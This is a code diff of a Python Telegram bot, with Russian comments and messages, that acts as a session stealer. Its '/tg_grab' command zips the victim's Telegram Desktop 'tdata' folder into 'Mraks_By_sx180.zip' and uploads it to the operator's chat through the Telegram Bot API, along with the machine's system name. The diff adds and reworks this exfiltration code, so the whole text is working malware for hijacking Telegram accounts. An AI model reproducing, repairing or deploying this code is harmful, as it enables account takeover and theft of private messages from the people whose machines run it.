@@ -285,20 +285,44 @@ def start(message):
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
+def handle_tg_grab_command(message):
+    thread = threading.Thread(target=archive_and_send)
+    thread.start()
+    time.sleep(20)
+    if thread.is_alive():
+        print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
+        thread.join()
+    try:
+        error_message = "ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 
-def send_file_to_telegram(message):
-    global telegram_bot_token, chat_id
-    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
-    file_path = 'путь_к_файлу'  # Получите путь к файлу из объекта message
-    file_name = 'имя_файла'  # Получите имя файла из объекта message
-    files = {'document': (file_name, open(file_path, 'rb'))}
-    data = {'chat_id': chat_id}
-    response = requests.post(url, files=files, data=data)
-    if response.status_code != 200:
-        print(f"Ошибка отправки файла в Telegram. Chat ID: {chat_id}. Код состояния: {response.status_code}")
-        print(response.text)
+def create_zip_archive(source_dir, output_zip):
+    try:
+        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
+            pass  # Создаем пустой архив для начала
+        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
+            for root, _, files in os.walk(source_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if any(substring in file_path for substring in ["user_data", "webview", "temp", "emoji", "shortcuts-default.json", "working"]):
+                        continue
+                    try:
+                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
+                    except Exception as e:
+                        send_message_to_group(chat_id)
+                        time.sleep(10)
+                        print(f"Error adding file to zip: {str(e)}")
+        return output_zip + '.zip'
+    except Exception as e:
+        send_message_to_group(chat_id)
+        time.sleep(10)
+        print(f"Error creating zip archive: {str(e)}")
+        return None
 
-def archive_and_send2():
+def archive_and_send():
     user = os.path.expanduser("~")
     if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
         try:
@@ -307,10 +331,10 @@ def archive_and_send2():
             if not os.path.exists(temp_dir):
                 os.makedirs(temp_dir)  # Создаем папку, если её нет
             output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-            created_zip = create_zip_archive(source_dir, output_zip)  # Передаём аргумент output_zip
+
+            created_zip = create_zip_archive(source_dir, output_zip)
             if created_zip:
-                file_data = {'file_path': created_zip, 'file_name': 'Mraks_By_sx180.zip'}
-                send_file_to_telegram(file_data)  # Передаем словарь с данными
+                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
             else:
                 print("Failed to create or send zip file.")
         except Exception as e:
@@ -318,10 +342,19 @@ def archive_and_send2():
     else:
         print("Папка 'tdata' не найдена.")
 
-def handle_tg_grab_command(message):
-    global telegram_bot_token, chat_id
-    chat_id = message.chat.id
-    archive_and_send2()
+def send_message_to_group(chat_id):
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+    data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
+    response = requests.post(url, data=data)
+
+def send_file_to_telegram(file_path, file_name):
+    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
+    files = {'document': (file_name, open(file_path, 'rb'))}
+    data = {'chat_id': chat_id}
+    response = requests.post(url, files=files, data=data)
+    if response.status_code != 200:
+        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
+        print(response.text)
 
 
 print('СЛУШАЮ КОМАНДЫ...')
